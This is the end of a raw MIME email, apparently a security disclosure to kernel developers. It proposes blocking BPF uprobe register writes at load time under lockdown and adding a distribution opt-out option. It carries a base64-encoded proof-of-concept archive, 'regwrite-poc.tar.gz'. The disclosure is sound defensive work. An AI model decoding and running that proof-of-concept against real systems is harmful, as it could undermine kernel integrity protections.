<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
(b) Introduce a dedicated LOCKDOWN_BPF_WRITE_REGS reason at</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; LOCKDOWN_INTEGRITY_MAX scope, for clearer audit messages, and=
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; check it in the same place.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Either way the check belongs at verify/load time rather than attach</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
time, so the program is refused outright rather than attaching as a</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
no-op.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Orthogonally, a CONFIG_BPF_UPROBE_OVERRIDE knob (mirroring</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
CONFIG_BPF_KPROBE_OVERRIDE for bpf_override_return) would let</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
distributions opt out independent of lockdown.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
thanks,</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
X.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
</body>
</html>

--_000_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_--

--_004_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_
Content-Type: application/x-gzip; name="regwrite-poc.tar.gz"
Content-Description: regwrite-poc.tar.gz
Content-Disposition: attachment; filename="regwrite-poc.tar.gz"; size=3697;
	creation-date="Mon, 27 Apr 2026 12:31:43 GMT";
	modification-date="Mon, 27 Apr 2026 12:31:43 GMT"
Content-Transfer-Encoding: base64

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

--_004_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_--
